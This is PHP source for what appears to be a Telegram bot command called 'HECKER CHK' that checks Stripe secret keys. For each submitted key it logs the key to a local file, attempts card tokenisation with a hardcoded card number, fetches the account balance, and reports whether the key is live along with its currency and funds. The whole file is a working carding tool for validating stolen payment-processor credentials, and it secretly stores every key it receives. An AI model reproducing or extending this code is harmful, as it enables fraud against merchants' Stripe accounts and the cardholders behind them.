<?php
$time_start = microtime(true);
if ((strpos($message, "/sk") === 0)||(strpos($message, "!sk") === 0)||(strpos($message, ".sk") === 0)){
  sendaction($chatId, typing);
$sec = substr($message, 4);
  file_put_contents('./tmp/sk.txt', $sec . PHP_EOL, FILE_APPEND);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$msg = Getstr($result,'"message": "','"');
  $sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$result1 = curl_exec($ch);
$curr = Getstr($result1,'"currency": "','"');
  $balance = trim(strip_tags(getStr($result1,'{
  "object": "balance",
  "available": [
    {
      "amount":',',')));
$pending = trim(strip_tags(getStr($result1,'"livemode": true,
  "pending": [
    {
      "amount":',',')));
  $time_end = microtime(true);
  $execution_time = ($time_end - $time_start);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: DEAD KEY❌%0A[ϟ] RESPONSE: <code>$msg</code>%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>%0A", $message_id);
}elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: DEAD KEY❌%0A[ϟ] RESPONSE: <code>$msg</code>%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>%0A", $message_id);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: MISSING KEY❌%0A[ϟ] RESPONSE: <code>$msg</code>%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>%0A", $message_id);
}
elseif ((strpos($result, 'rate_limit')) || (strpos($result, 'rate_limit'))){
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: VALID SK KEY✅%0A[ϟ] RESPONSE: RATE LIMIT ⚠️.%0A[ϟ] CURRENCY: $curr%0A[ϟ] BALANCE: $balance%0A[ϟ] PENDING AMOUNT: $pending%0A[ϟ] CARDS PROCESSED: $pending%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>%0A", $message_id);
}  
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: DEAD KEY❌%0A[ϟ] RESPONSE: <code>$msg</code>%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>", $message_id);
}else{
sendMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: SK KEY CHK%0A[ϟ] SK KEY: <code>$sec</code>%0A[ϟ] STATUS: VALID SK KEY✅%0A[ϟ] RESPONSE: Provided SK KEY is Live!✅%0A[ϟ] CURRENCY: $curr%0A[ϟ] BALANCE: $balance%0A[ϟ] PENDING AMOUNT: $pending%0A[ϟ] CARDS PROCESSED: $pending%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>%0A", $message_id);
}
}
?>